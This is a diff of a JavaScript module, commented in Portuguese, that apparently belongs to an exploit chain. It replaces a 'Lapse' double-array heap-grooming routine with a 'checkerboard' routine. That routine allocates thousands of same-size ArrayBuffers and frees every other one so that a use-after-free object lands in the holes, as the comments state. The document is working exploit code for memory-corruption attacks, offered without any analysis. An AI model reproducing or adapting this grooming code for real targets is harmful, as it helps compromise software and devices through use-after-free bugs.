@@ -1,20 +1,32 @@
 import { log } from './utils.mjs';
 
-var stable_heap = [];
+var grooming_stash = [];
 
-// Técnica Lapse: Large Object Space com Double Arrays
-export function prepare_heap_grooming() {
-    log("HEAP: Iniciando Lapse Grooming...");
+// Estratégia "Checkerboard" (Tabuleiro de Xadrez)
+// Aloca: [Ocupado] [Livre] [Ocupado] [Livre]
+// Isso fragmenta o Heap de propósito para capturar o objeto UAF.
+export function prepare_checkerboard_heap(size) {
+    log(`HEAP: Criando padrão Checkerboard para tamanho 0x${size.toString(16)}...`);
+    
     try {
-        // Aloca 500MB+ de arrays de doubles para limpar fragmentação
-        for (let i = 0; i < 500; i++) {
-            let a = new Array(1024 * 16); // 64KB chunks
-            for (let j = 0; j < a.length; j++) {
-                a[j] = 1.1; // Força representação float (Double)
-            }
-            stable_heap.push(a);
+        // 1. Alocação Massiva
+        let temp_stash = [];
+        for (let i = 0; i < 2000; i++) {
+            // Usamos ArrayBuffers do tamanho exato que estamos testando
+            let ab = new ArrayBuffer(size);
+            temp_stash.push(ab);
         }
-        log("HEAP: Memória estabilizada e alinhada.", "success");
+
+        // 2. Criar Buracos (Free alternado)
+        // Liberamos 1 a cada 2 (ou 3) para criar slots vazios
+        for (let i = 0; i < temp_stash.length; i += 2) {
+            temp_stash[i] = null; // O GC vai liberar estes slots
+        }
+        
+        // Guardamos o resto para manter a estrutura
+        grooming_stash = temp_stash.filter(x => x !== null);
+        
+        log("HEAP: Padrão criado. Buracos prontos para o UAF.", "success");
     } catch (e) {
         log("HEAP ERRO: " + e, "fail");
     }
